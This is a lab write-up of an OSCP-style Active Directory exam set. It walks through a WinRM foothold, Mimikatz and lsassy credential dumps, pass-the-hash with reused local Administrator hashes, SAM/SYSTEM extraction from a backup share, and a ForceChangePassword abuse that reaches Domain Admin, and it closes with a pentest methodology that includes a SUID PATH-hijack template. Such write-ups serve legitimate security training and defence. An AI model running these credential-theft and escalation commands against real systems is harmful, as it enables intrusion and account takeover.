01

Reconnaissance

One reachable host, two behind it

Three addresses, one domain, and only one of them answers from the exam network. The other two sit behind it, which is why this box is a pivot before it is anything else.

1.1 The target list

output
172.16.97.200
172.16.97.202
172.16.97.206

Domain: oscp.exam (NetBIOS OSCP). Two host names show up once shells start: WS26, the member server that is reachable from the start, and SRV22, the domain controller behind it.

Address Host Role Reachable from Kali
172.16.97.206 WS26 member server, XAMPP, WinRM yes
172.16.97.200 SRV22 domain controller, Server 2022 only through WS26
172.16.97.202 [redacted] second member server only through WS26, never breached

1.5 Reading the scan correctly

Observation What it means What to do
5985 on the member server WinRM is exposed validate the given credential there first
XAMPP on 80/443/8080 a PHP application with MySQL behind it enumerate it, but expect a decoy
445 open on every host SMB is the shared surface credential validation and share enumeration
DC ports only behind WS26 the domain is not directly reachable a tunnel is mandatory before Kerberos or LDAP work
3389 on the member server RDP is available once a local admin exists alternative access, not an entry point

1.6 Order of work

  1. Validate the given credential over SMB, then WinRM, on 172.16.97.206. It costs a minute and it is the intended door.
  2. Read the token before attacking anything — whoami /priv decides the whole box (see 03-privilege-escalation.md).
  3. Pivot before touching Kerberos. SRV22 is not reachable without the tunnel, so every domain-level attack waits for 04-pivot.md.
  4. Leave the web application for last. A credential dump from phpMyAdmin looks like progress and usually is not.

02

Foothold

WinRM as p.andrew on WS26

The set hands over one domain credential. It is a normal user — no admin groups, no interesting group membership — and it is enough, because 172.16.97.206 is running WinRM.

2.1 Validate the credential

command
nxc smb 172.16.97.206 -u p.andrew -p '[redacted]' -d oscp.exam
nxc winrm 172.16.97.206 -u p.andrew -p '[redacted]' -d oscp.exam
output
SMB         172.16.97.206   445    WS26    [*] Windows Server 2019 Build 17763 x64 (name:WS26) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         172.16.97.206   445    WS26    [+] oscp.exam\p.andrew:[redacted]
WINRM       172.16.97.206   5985   WS26    [*] Windows Server 2019 Build 17763 (name:WS26)
WINRM       172.16.97.206   5985   WS26    [+] oscp.exam\p.andrew:[redacted] (Pwn3d!)

(Pwn3d!) on WinRM is the whole foothold: the account is a member of Remote Management Users on that host, so the credential is a shell, not just a login. SMB accepts it too, but SMB only proves the password — WinRM proves the authorisation.

2.2 The shell

The account is deliberately ordinary: it authenticates, it opens a shell, and it holds nothing else. The next question is not "what can this user read" — it is "what does this token carry".

2.3 The token

command
whoami /priv
output
Privilege Name                Description                               State
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
SeDebugPrivilege              Debug programs                            Enabled

Two lines matter here:

Privilege State What it unlocks
SeImpersonatePrivilege Enabled a potato-style token theft → SYSTEM on this host
SeDebugPrivilege Enabled open any process, including lsass.exe → every credential on the machine

SeImpersonatePrivilege enabled is already a privilege-escalation primitive on its own, and it is the usual reason a web shell becomes SYSTEM. SeDebugPrivilege is the shorter path: it does not need a rogue service or a coerced authentication, only a process that can read another process's memory.

whoami /priv is not a formality. Two lines in that table decide whether the box is a ten-minute privesc or a six-hour one.

2.4 What the foothold actually gives

  • A shell as a domain user on a member server, with C:\Users\p.andrew writable — somewhere to drop tooling.
  • A token with SeDebugPrivilege, which is the real door (next chapter).
  • A working route to the domain controller for LDAP, SMB and Kerberos — WS26 can talk to SRV22 even though Kali cannot, which is what makes the tunnel and BloodHound possible later.

The foothold itself is worth nothing. The privilege in the token is worth the machine.

03

Privilege escalation

SeDebugPrivilege, Mimikatz, local Administrator

No kernel exploit, no unquoted service path, no misconfigured ACL. The account is allowed to debug processes, lsass.exe is a process, and lsass.exe holds every credential on the machine.

3.1 Why Mimikatz needs SeDebugPrivilege

lsass.exe runs as SYSTEM and is protected: opening it with PROCESS_VM_READ requires SeDebugPrivilege. Mimikatz's first command is therefore always:

output
privilege::debug

If the token has the privilege, this returns Privilege '20' OK; if it does not, every later command fails with access denied. That single line tells you whether the box is over.

3.2 The WinRM problem

Mimikatz is normally run interactively: start it, get a mimikatz # prompt, type commands. Over evil-winrm there is no interactive console — the session is a remote PowerShell pipeline, and a program that expects a terminal simply does not start. mimikatz.exe prints its banner and exits, and Invoke-Mimikatz without arguments does nothing useful.

Mimikatz accepts commands as arguments instead, which is the workaround:

command
.\Invoke-Mimikatz.ps1 "privilege::debug" "sekurlsa::logonpasswords"

Each quoted argument is executed in order, exactly as if it had been typed at the mimikatz # prompt, and the output is returned to the PowerShell session. This is the technique that makes Mimikatz usable in any non-interactive context: WinRM, a webshell, a scheduled task, a psexec one-liner.

Upload Invoke-Mimikatz.ps1 first — upload /opt/tools/Invoke-Mimikatz.ps1 . from the evil-winrm prompt — then invoke it from the current directory.

command
*Evil-WinRM* PS C:\Users\p.andrew\Documents> upload /opt/tools/Invoke-Mimikatz.ps1 .
*Evil-WinRM* PS C:\Users\p.andrew\Documents> .\Invoke-Mimikatz.ps1 "privilege::debug" "sekurlsa::logonpasswords"

3.4 Pass-the-hash to local Administrator

The hash is enough; the plaintext never needs to be recovered.

command
nxc winrm 172.16.97.206 -u Administrator -H '[redacted]' --local-auth
output
WINRM       172.16.97.206   5985   WS26    [*] Windows Server 2019 Build 17763 (name:WS26)
WINRM       172.16.97.206   5985   WS26    [+] WS26\Administrator:[redacted] (Pwn3d!)

--local-auth is the important flag: without it, netexec authenticates Administrator against the domain, where the account either does not exist or has a different password. With it, the hash is checked against the local SAM — which is exactly where it came from.

command
evil-winrm -i 172.16.97.206 -u Administrator -H '[redacted]'
output
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ws26\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
WS26
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\local.txt
[redacted]

That is the machine's half of the box. The domain half — proof.txt on SRV22 — needs a domain administrator, and the rest of this lab is the search for one.

3.6 What this buys

Capability Why it matters
Read every local file configuration, scripts, notes, saved RDP sessions
Install a service / run a binary as SYSTEM a stable agent instead of a fragile shell
Use the machine as a network position the member server can reach the DC that Kali cannot
Dump local secrets local accounts reused elsewhere, service passwords

The pivot is the next chapter, and it is the reason this escalation matters: WS26 can see a network the attacker cannot.

3.7 Why the box is built this way

The privilege is not a bug in the application — it is an assignment. Somebody put p.andrew (or a group it belongs to) in a policy that grants SeDebugPrivilege, probably to make some monitoring or backup tool work. That is a realistic misconfiguration and a very common one: the account is not an administrator, it just carries one attribute administrators have.

The defensive fix is unglamorous: audit SeDebugPrivilege, SeImpersonatePrivilege and SeBackupPrivilege assignments, and remember that any of them is equivalent to local admin. Then enable LSASS protection (RunAsPPL) so that even a debug privilege cannot read the dump.

04

Pivot

ligolo-ng into 172.16.97.0/24

172.16.97.200 and 172.16.97.202 do not answer from the exam network. WS26 sits on both sides: one interface faces the attacker, the other faces the domain. Local Administrator on WS26 is therefore not a trophy, it is a network position.

4.1 What the pivot has to solve

command
nmap -Pn -p88,389,445 172.16.97.200 172.16.97.202
output
Nmap scan report for 172.16.97.200
Host is up.
All 3 scanned ports on 172.16.97.200 are in ignored states.
Not shown: 3 filtered tcp ports (no-response)

Nmap scan report for 172.16.97.202
Host is up.
All 3 scanned ports on 172.16.97.202 are in ignored states.

The hosts are alive and every port is filtered — a firewall that permits the member server and nothing else. Traffic has to leave from WS26.

05

Dead ends

Kerberos, database, RDCMan, shares

With a local Administrator shell and a tunnel into the domain, every obvious next move is available. All of them fail, and the reason they fail is the same: the box is built so that the only useful credential is on the host that cannot be entered yet.

5.1 Kerberos — tickets without a use

The first domain move is to ask SRV22 for service tickets and crack them offline.

command
sudo impacket-GetUserSPNs -dc-ip 172.16.97.200 oscp.exam/p.andrew:'[redacted]' -request
output
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

Nothing to do with the credential. Kerberos refuses tickets when the client clock and the DC clock differ by more than five minutes, and the exam VM had drifted. Sync against the DC and repeat:

command
sudo ntpdate 172.16.97.200
## or, if ntpdate is not installed
sudo rdate -n 172.16.97.200
output
ServicePrincipalName                  Name        MemberOf  PasswordLastSet   LastLogon   Delegation
------------------------------------  ----------  --------  ----------------  ----------  ----------
http/[redacted].oscp.exam             [redacted]  ...       ...               ...         ...

Tickets come back, hashcat -m 13100 runs, and nothing cracks to a credential that is accepted anywhere. The service accounts are either long-password accounts or decoys; either way the set does not need them.

command
hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt
What was tried Result
GetUserSPNs -request KRB_AP_ERR_SKEW, then SPNs returned after a clock sync
hashcat -m 13100 on the tickets no usable plaintext
the cracked candidates against SMB and WinRM rejected

5.2 The database — credentials that lead nowhere

WS26 runs XAMPP, and XAMPP means MySQL with a config.inc.php holding the database password. Local Administrator can read it, log in, and dump every table.

command
type C:\xampp\htdocs\[redacted]\config.inc.php
mysql -u root -p'[redacted]' -e "show databases;"
mysqldump -u root -p'[redacted]' --all-databases > C:\Users\Administrator\Desktop\dump.sql
output
Database
information_schema
mysql
performance_schema
[redacted]

The application database is full of user rows and password hashes — a lot of them, in plaintext and in MD5. None of them authenticate against the domain, and none of them are reused on SRV22 or 172.16.97.202.

command
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
nxc smb 172.16.97.0/24 -u [redacted] -p '[redacted]'
output
SMB         172.16.97.206   445    WS26    [-] oscp.exam\[redacted]:[redacted] STATUS_LOGON_FAILURE
SMB         172.16.97.202   445    [redacted]    [-] oscp.exam\[redacted]:[redacted] STATUS_LOGON_FAILURE

This is the box's main decoy. A database with hundreds of credentials feels like the centre of the lab; here it is background noise, and every hour spent cracking it is an hour not spent on the token.

5.3 RDCMan — a saved session, encrypted

----                 -------------         ------ ----
-a----         7/16/2026   6:12 AM           1842 [redacted].rdc

The file contains a <server> entry and a <password> element, but RDCMan stores the password encrypted with the user's DPAPI master key. Reading it needs that user's profile unlocked — which is exactly the context you already have and exactly the context that does not help:

command
type C:\Users\Administrator\Documents\[redacted].rdc
output
<logonCredentials inherit="None">
  <userName>[redacted]</userName>
  <domain>[redacted]</domain>
  <password>[redacted]</password>
</logonCredentials>

Decrypting DPAPI blobs from a WinRM session is possible in principle and unreliable in practice; the values recovered here were not accepted on SRV22 or 172.16.97.202. A saved RDP profile is worth opening, not worth a detour.

5.4 SMB shares — the default set

With a local administrator hash in hand, the obvious sweep is every share on every host:

command
nxc smb 172.16.97.0/24 -u Administrator -H '[redacted]' --local-auth --shares
output
SMB         172.16.97.206   445    WS26    [+] WS26\Administrator:[redacted] (Pwn3d!)
SMB         172.16.97.206   445    WS26    [*] Enumerated shares
SMB         172.16.97.206   445    WS26    Share           Permissions     Remark
SMB         172.16.97.206   445    WS26    -----           -----------     ------
SMB         172.16.97.206   445    WS26    ADMIN$          READ,WRITE      Remote Admin
SMB         172.16.97.206   445    WS26    C$              READ,WRITE      Default share
SMB         172.16.97.206   445    WS26    IPC$            READ            Remote IPC
SMB         172.16.97.202   445    [redacted]    [-] WS26\Administrator:[redacted] STATUS_LOGON_FAILURE

--local-auth matters: the hash is a WS26 SAM hash and means nothing on 172.16.97.202. The sweep returns the default administrative shares on the host that is already owned, and a logon failure on the host that is not.

5.5 Backups on the other machine

The last lead was the backup directory on 172.16.97.202 — the kind of folder that holds a ntds.dit, a script with a password, or a copy of somebody's profile. Nothing in hand could read it:

command
smbclient -L //172.16.97.202 -U 'oscp.exam\p.andrew%[redacted]'
smbclient //172.16.97.202/[redacted] -U 'oscp.exam\p.andrew%[redacted]'
output
session setup failed: NT_STATUS_ACCESS_DENIED

A backup share is the right instinct — backups are where credentials leak — but the instinct needs a credential that the share accepts, and this one accepts nothing that was available.

5.6 Why all five failed

Lead Why it looked promising Why it was not
Kerberoasting a domain credential and a reachable DC the SPNs belong to accounts whose passwords do not crack
MySQL / phpMyAdmin hundreds of credential rows on an owned host application accounts, not domain accounts; nothing reused
RDCMan .rdc a saved RDP profile with a stored password DPAPI-encrypted, and the recovered values are not valid
SMB shares local admin on a domain member the hash is local; the other host rejects it
Backup directory backups concentrate secrets no credential the share accepts

The common thread is worth stating plainly: every one of these produces credentials, and none of them produces an identity. The set does not reward volume of loot; it rewards the one account that has an outbound ACL to Domain Admin. That account is what BloodHound is for.

06

BloodHound & the wall

The DA path that could not be walked

Everything up to here is enumeration. BloodHound is the first tool that answers the only question that matters on a domain: which account can reach Domain Admin, and do I hold it?

6.1 Collect

With the tunnel up, SRV22 is reachable over LDAP and p.andrew can read the directory.

command
rusthound-ce -d oscp.exam -u p.andrew -p '[redacted]' -dc SRV22.oscp.exam -z
output
[+] Connecting to SRV22.oscp.exam:389
[+] Authenticated as oscp.exam\p.andrew
[+] Collecting users
[+] Collecting groups
[+] Collecting computers
[+] Collecting ACLs
[+] Collecting sessions
[+] Saving to 20260716204535_oscp_exam.zip
command
## alternative collector, same data
bloodhound-python -u p.andrew -p '[redacted]' -d oscp.exam -ns 172.16.97.200 -c All

Import the zip into BloodHound and mark p.andrew as owned.

6.2 What the graph says

The shortest path to Domain Admin does not run through anything in hand. It runs through two accounts, and only the second one is privileged:

output
p.andrew ──▶ (no path)
A.NEWMAN ──ForceChangePassword──▶ A.BETTY ──MemberOf──▶ DOMAIN ADMINS

A.NEWMAN is an ordinary user, not a Domain Admin. What makes it valuable is a single extended right on the A.BETTY user object: ForceChangePassword lets the holder set that account's password without knowing the old one. A.BETTY is a Domain Admin, so the graph is a two-step path — if the first account's password is known:

command
## what the path looks like with the account in hand
net rpc password "A.BETTY" '[redacted]' -U 'oscp.exam/A.NEWMAN%[redacted]' -S 172.16.97.200

That is the wall as it looked from WS26: the graph is complete, the edge is real, and the vertex is missing.

6.3 Where the missing credential is

The account is not a service account with an SPN, so Kerberoasting does not touch it. It is not in the SQL dump. It is not in the RDCMan profile. The one place it must be is 172.16.97.202 — the second member server, the only host in the set that was never entered.

The reasoning is structural, not a guess:

Host State at this point Contents
WS26 owned, local Administrator XAMPP, MySQL, RDCMan profile, default shares — all exhausted
SRV22 reachable, not owned the directory itself; no credential material without an admin
172.16.97.202 reachable, not owned the only unexamined disk in the set

A domain user's credential does not live on a domain controller in a readable form; it lives on the workstation or server where that user logs in. The second server is that machine. It has no web application and no WinRM — just SMB, RDP and one share that a domain user can read. That share is the way in, and it only appears when the domain is spelled out in the credential string: the subject of chapter 07.

6.4 The decision to stop

At this point in the sitting the box is worth one flag and no more:

Item State
local.txt on WS26 obtained, masked
proof.txt on SRV22 not obtained
Domain Admin not obtained
Remaining path a credential on 172.16.97.202 — reachable, no way in yet

Continuing at that moment means attacking a host with no identified entry point, on the clock, with the rest of the exam still to sit. The correct call is to bank the flag, write the notes, and come back with a different idea — which is what happened, and chapter 07 is the return visit.

6.5 What would have opened it

Worth writing down, because the next set may differ by one detail:

  • A readable backup share. This is what actually opened it: 172.16.97.202 exposed a Backup share to a normal domain user, and it held SAM and SYSTEM. A share sweep that stops at the default shares never sees it.
  • A domain account in the SQL dump. One row with OSCP\ in front of it would have changed everything; the dump was checked for exactly that and had none.
  • A Kerberoastable service account on the second server. Its SPNs would have been in the same GetUserSPNs output; nothing there cracked.
  • A writable share or a scheduled task. The share sweep covered WS26 only, because the hash was local. On the second server the readable Backup share was there all along and was skipped: the listing without the domain prefix made it look empty.

6.6 What the box teaches

  1. Read the token first. whoami /priv turned a normal user into local Administrator in one step; everything else in this lab follows from that line.
  2. Pivot before you enumerate the domain. SRV22 was invisible until the tunnel existed. On a three-host set, the first host is a doorway, not a destination.
  3. Loot is not access — until it is. A database of hashes and an RDP profile produced nothing. A backup share produced a local Administrator hash, and that hash was the way in.
  4. BloodHound is for confirmation, not for hope. It told the truth — the path exists — and it also told the truth that the path needs an account that was not available.
  5. Bank what you have. One flag and a clear write-up beats a half-finished domain and no notes.

The wall was real from WS26, and only from WS26. The next chapter picks the same second server up with a domain-qualified credential, and the share that produced nothing here produces the hash that finishes the set.

07

The Backup share

SAM + SYSTEM, and the domain prefix that mattered

The first pass stopped at a wall that was not a wall. BloodHound was clear about the shape of the path — A.NEWMAN can force a password change on A.BETTY, and A.BETTY is Domain Admin — but the credential that does it was not on WS26. The other half of the path was on the second server: the same shares were enumerated again later, with one small difference, and it opened.

7.1 The difference that mattered

The first attempt was a share listing without a domain in the credential string. It authenticated, listed almost nothing and looked like a dead end:

command
smbclient -L //172.16.97.202 -U 'p.andrew%[redacted]'

The second attempt spells the domain out in the -U value, and the same account sees the share that matters:

command
smbclient -L //172.16.97.202 -U 'oscp.exam/p.andrew%[redacted]'
output
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        Backup          Disk      System Backups
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 172.16.97.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

That is the lesson of this box in one line: on a one-domain network the domain prefix should be redundant, and here it is not. Backup — comment System Backups — is the share that the whole set was built around.

7.2 Inside the share

command
smbclient //172.16.97.202/Backup -U 'oscp.exam/p.andrew%[redacted]'
output
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan 22 11:40:11 2026
  ..                                  D        0  Tue Jul 21 16:27:09 2026
  SystemBackup                        D        0  Wed Feb  4 18:18:42 2026

                42885120 blocks of size 4096. 14881285 blocks available

A single directory, and the name says exactly what is in it. The files are pulled in one pass rather than one by one, because smbclient can mirror a tree with tar semantics:

output
smb: \> tarmode
tarmode is now full, system, hidden, nonroot, noacls
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \SystemBackup\SAM of size 49152 as SystemBackup/SAM (136.4 KiloBytes/sec) ...
getting file \SystemBackup\SYSTEM of size 13115392 as SystemBackup/SYSTEM (178.6 KiloBytes/sec)
smb: \> exit

SAM and SYSTEM together — the two hives that are useless apart and complete together. SYSTEM carries the boot key, SAM carries the hashes, and impacket-secretsdump wants both. This is a system-state backup of a Windows machine sitting on a share that a normal domain user can read.

7.3 Offline extraction of the local hashes

Everything happens locally; the target is never touched again:

command
cd SystemBackup
sudo impacket-secretsdump -sam SAM -system SYSTEM local
output
Impacket v0.12.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: [redacted]
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[redacted]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Three things are worth reading out of that block:

Line Meaning
Administrator:500 the built-in local administrator of the machine that produced the backup
aad3b435b51404ee... + [redacted] an NT hash with the LM half empty, i.e. a modern password
31d6cfe0d16ae931b73c59d7e0c089c0 the NT hash of an empty password — Guest and DefaultAccount are simply disabled

The Administrator NT hash is the object of the exercise. It is a local credential, so it does not open the domain by itself. What it does open is the machine the backup came from — which is the host the first pass could never enter.

08

LSASS → A.NEWMAN

--local-auth on SRV22, lsassy over SMB

The hash from the backup is a local credential, so the first thing it buys is the machine it came from: 172.16.97.202 accepts Administrator with --local-auth and nothing else changes in the domain. That is the entry the first pass never found.

8.1 Pass-the-hash against the second server

command
nxc smb 172.16.97.202 -u Administrator -H '[redacted]' -d oscp.exam --local-auth
output
SMB         172.16.97.202   445    [redacted]    [*] Windows Server 2019 Build 17763 x64 (name:[redacted]) (domain:oscp.exam) (signing:False) (SMBv1:None)
SMB         172.16.97.202   445    [redacted]    [+] [redacted]\Administrator:[redacted] (Pwn3d!)

(Pwn3d!) on a member server means local administrator, which is all that is needed for the next move. No shell is required: the interesting material is in memory, and NetExec can read it over SMB.

8.2 The same password is on the domain controller

The set was built from one image, and the local Administrator password is reused. Pointing the same hash at SRV22 therefore authenticates there as well — --local-auth is checked against the machine's own SAM:

command
nxc smb 172.16.97.200 -u Administrator -H '[redacted]' -d oscp.exam --local-auth -M lsassy
output
SMB         172.16.97.200   445    SRV22    [*] Windows Server 2022 Build 20348 x64 (name:SRV22) (domain:SRV22) (signing:True) (SMBv1:None)
SMB         172.16.97.200   445    SRV22    [+] SRV22\Administrator:[redacted] (Pwn3d!)
SMB         172.16.97.200   445    SRV22    [*] lsassy
SMB         172.16.97.200   445    SRV22    OSCP.EXAM\A.NEWMAN:[redacted]

The lsassy module is the interesting half. It does not crack anything: it uploads a small dumper, opens lsass.exe with the local administrator rights that were just obtained, and asks for sekurlsa::logonpasswords in memory. Whatever was logged on to that server interactively is in the answer in clear text.

A.NEWMAN was one of those logons. A domain account with a session on SRV22 is exactly the account BloodHound had already flagged in the first pass.

8.3 Why this account, and not the Administrator hash

SRV22\Administrator with --local-auth is local administrator on the domain controller — enough to read a desktop, not enough to be Domain Admin. A.NEWMAN is a domain identity, and the directory grants it a specific right over a specific account:

output
A.NEWMAN  ──ForceChangePassword──▶  A.BETTY

That edge, collected with BloodHound in the first pass, is what the clear-text password unlocks. The next chapter is two commands long.

09

ForceChangePassword

A.BETTY, Domain Admin, proof.txt

Everything the first pass could only describe is now executable. A.NEWMAN has a clear-text password, and BloodHound says that account holds one right over one user:

output
A.NEWMAN  ──ForceChangePassword──▶  A.BETTY   (Domain Admin)

ForceChangePassword is an extended right on the user object: the holder may set the target's password without knowing the old one. No session as A.BETTY is needed, no hash, no cracking — only the ability to speak SAMR to a domain controller as A.NEWMAN.

9.1 Changing the password over SAMR

command
net rpc password "A.BETTY" '[redacted]' -U 'oscp.exam/A.NEWMAN%[redacted]' -S 172.16.97.200

The command is silent on success. net rpc password authenticates as A.NEWMAN, opens the SAMR pipe on SRV22 and issues SamrSetInformationUser2 with the new password for A.BETTY — the same operation an administrator performs from dsa.msc, minus the console.

Two details make it work where a login would not:

Detail Why it matters
-U 'oscp.exam/A.NEWMAN%...' the domain prefix, for the same reason as the SMB share in chapter 07
-S 172.16.97.200 the change is made on the DC that holds the account, not on the member server

9.2 Domain Admin

A.BETTY is a member of Domain Admins, so the new password is a Domain Admin credential. WinRM is open on SRV22, which the first pass noted as "tempting and useless with the accounts in hand" — with this account it is neither:

command
evil-winrm -i 172.16.97.200 -u A.BETTY -p '[redacted]'
output
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txt
[redacted]

That is the domain half of the set. The full chain, in one line:

output
Backup share (.202) → SAM + SYSTEM → local Administrator hash
      → --local-auth on SRV22 → LSASS → A.NEWMAN cleartext
      → ForceChangePassword → A.BETTY → Domain Admin → proof.txt

9.3 What the box was actually testing

Nothing in this chain is exotic. Each step is in the OSCP syllabus, and each one was already visible in the first pass:

Step The trap
Backup share the domain prefix in -U — without it the share looks empty
SAM + SYSTEM recognising that a file-share backup is a credential store
--local-auth reading "local Administrator" as a position, not a trophy
LSASS a domain logon on a member server leaks a domain identity
ForceChangePassword an ACL edge is a credential path, not a curiosity

The wall in the first pass was real in the sense that no amount of enumeration on WS26 would have produced the hash. It was not real in the sense that the path was blocked: it was one share away, on a host that was already reachable.

10

Methodology

The repeatable per-box loop

The loop I run on every box, in order, with the rule that makes each step worth its time. This is deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only where evidence points.

Phase 0 — Setup

command
mkdir -p /tmp/<box> && cd /tmp/<box>
export TARGET=<ip>

Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the report afterwards trivial and stops me confusing two boxes' output.

Phase 1 — Reachability and TCP

Step Command Rule
Ping ping -c 2 -W 2 $TARGET TTL tells you the OS before you scan (64 Linux, 128 Windows)
Full TCP nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET Always -p-. A top-1000 scan is a guess
Versions nmap -sV -sC -p<open> -oN services.txt $TARGET Only the open ports; -sC is cheap and occasionally decisive

Decision: for each open port, ask "what is the configuration weakness most likely to be, given this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.

Phase 2 — UDP (do not skip this)

command
nmap -sU --top-ports 30 -T4 --max-retries 1 --host-timeout 180s $TARGET

If 161/udp is open:

command
for c in public private manager internal; do
  snmpwalk -v1 -c "$c" -t 5 -r 1 $TARGET 1.3.6.1.2.1.1 2>&1 | head -3
done

Then, on success, always:

command
snmpwalk -v1 -c public $TARGET 1.3.6.1.4.1.8072.1.3.2   # nsExtendTable — the money tree
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.4.2.1.2   # process names
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.25.6.3.1.2   # installed packages
snmpwalk -v1 -c public $TARGET 1.3.6.1.2.1.4.20.1.1     # interface IPs

nsExtendTable gives you the commands the agent runs plus the admin's own description of them. Descriptions are written for an internal audience and routinely name accounts and policies.

Phase 3 — Per-service enumeration

For each service, in the order that historically pays fastest.

HTTP/HTTPS

command
curl -s -i http://$TARGET/ | head -20          # stock page? framework? redirect?
for p in robots.txt sitemap.xml .git/ .htaccess server-status; do
  curl -s -o /dev/null -w "%{http_code} %{size_download}  /$p\n" http://$TARGET/$p
done
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -t 40 -d 2 --smart --no-state -q
  • Note the 404 body size — it is your filter for everything after.
  • Vhosts: ffuf -u http://$TARGET/ -H "Host: FUZZ" -w <subdomains> -fr "<default page text>".
  • Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.

FTP

command
ftp -n -v $TARGET <<< $'user anonymous anon@test\nls\nbye'   # 530 on USER = anonymous_enable=NO
hydra -L users.txt -P pass.txt -t 4 -f ftp://$TARGET

Try the account name as the password. Check for key material, configs, and backups in the data directory — a shared /srv/ftp often leaks a different account's secrets.

SSH

command
ssh -i key -o BatchMode=yes user@$TARGET id      # never point a key at a host without -o BatchMode
ssh-keygen -l -f key                             # read the comment first: it names the user

SMB

command
nxc smb $TARGET -u '' -p '' --shares
nxc smb $TARGET -u guest -p '' --shares
nxc smb $TARGET -u user -p pass -d DOMAIN --shares

Phase 4 — Foothold

Get a shell, then immediately stabilise and record identity:

command
id; hostname; sudo -n -l; uname -a

Do not start hunting for privesc before you know exactly which uid and groups you hold — the escalation path depends on it.

Phase 5 — Local enumeration (Linux)

Send one script over one connection and read one report:

command
ssh user@$TARGET 'bash -s' < enum.sh

Checklist, in the order that finds things:

# Check Command
1 sudo rights sudo -n -l
2 SUID, excluding snap noise find / -perm -4000 -type f 2>/dev/null \| grep -v '^/snap'
3 Capabilities getcap -r / 2>/dev/null
4 Cron cat /etc/crontab; ls -la /etc/cron.*
5 Writable service files find / -writable -type f -path '*/etc/*' 2>/dev/null
6 Listening sockets ss -tlnp
7 Home directories ls -la /home/* — this box had the SUID helper in a user's home
8 History and keys ls -la ~/.ssh; cat ~/.bash_history
9 Kernel uname -a — only if 1–8 are empty
10 Password reuse the foothold password against sudo -S and other users

Rule: a custom SUID binary beats every generic exploit. Read it before reaching for linpeas output tables.

Phase 6 — Binary analysis (when a SUID binary looks custom)

command
file /path/binary                    # not stripped? then function names survive
strings -a /path/binary | head -40   # look for system, popen, exec*, and bare command names
objdump -d -M intel /path/binary | sed -n '/<main>:/,/^$/p'
readelf -d /path/binary | grep -E 'BIND_NOW|FLAGS'   # is RELRO full? (memory bugs are then out)

What you are looking for, in priority order:

  1. system() / popen() with a bare command name → PATH hijack (CWE-426)
  2. setuid(0)/seteuid(0) before that call → the shell will not drop privileges → full root
  3. A writable path used by root → symlink or overwrite attack
  4. A shell escape in a pager/editor it invokes

If the binary is setuid and setgid, or lives in a user-writable directory, the box author is telling you this is the path.

Phase 7 — Post-exploitation and reporting

command
cat /root/proof.txt; cat /home/*/local.txt
ip a; ip r          # can this host pivot? (single NIC + default route = no)

Record: exact flags, the id output as root, the mechanism in one paragraph, and every command with its output. Then clean up.

Cleanup checklist

  • Remove every file you created, then verify with ls.
  • Revert any file you modified.
  • Do not change credentials you do not own; if an exploit would have (this box's chpasswd), note that it did not run.
  • Note in the report what you changed and what you left alone.

Timeboxing heuristics

Situation Budget Move on when
Web on a stock default page 10 min Two wordlists + vhosts agree there is nothing
Version-CVE rabbit hole 5 min The package revision shows the backport
Credential guessing 5 min per service Account-specific defaults exhausted
Generic privesc sweep 15 min A custom SUID/service/cron finding exists

The recurring lesson: spend the time on the surface you have not looked at, not on the one you have already disproved. On this box, thirty UDP ports were worth more than an hour of web.

Binary analysis

command
file bin                                  # "not stripped" = function names survive
strings -a bin | head -40                 # system / popen / exec / bare command names
objdump -d -M intel bin | sed -n '/<main>:/,/^$/p'
readelf -d bin | grep -E 'BIND_NOW|FLAGS' # full RELRO => forget GOT overwrite
objdump -s -j .rodata bin | head          # resolve the strings passed to system()

Reconstructing source from a small binary:

output
+ setuid / setgid  →  setuid(0); setgid(0);
+ lea rdi,[rip+...] →  the argument is a fixed string
+ call system@plt  →  system("...")

Privesc — PATH hijack template

command
D=$(mktemp -d /tmp/x.XXXXXX)
cat > "$D/chpasswd" <<'EOF'
#!/bin/bash
id > /tmp/root_id.txt
cat /root/proof.txt > /tmp/root_proof.txt 2>&1
chmod 644 /tmp/root_id.txt /tmp/root_proof.txt
EOF
chmod +x "$D/chpasswd"

## name the faked binary exactly as the SUID program invokes it
PATH="$D:$PATH" /path/to/suid_binary

cat /tmp/root_id.txt

Works only when the SUID binary calls setuid(0)/seteuid(0) before system(). If it does not, the shell drops privileges and the payload runs as you. Check the disassembly order first.

Interactive variant:

command
printf '#!/bin/bash\n/bin/bash -p\n' > "$D/chpasswd"; chmod +x "$D/chpasswd"
PATH="$D:$PATH" /path/to/suid_binary
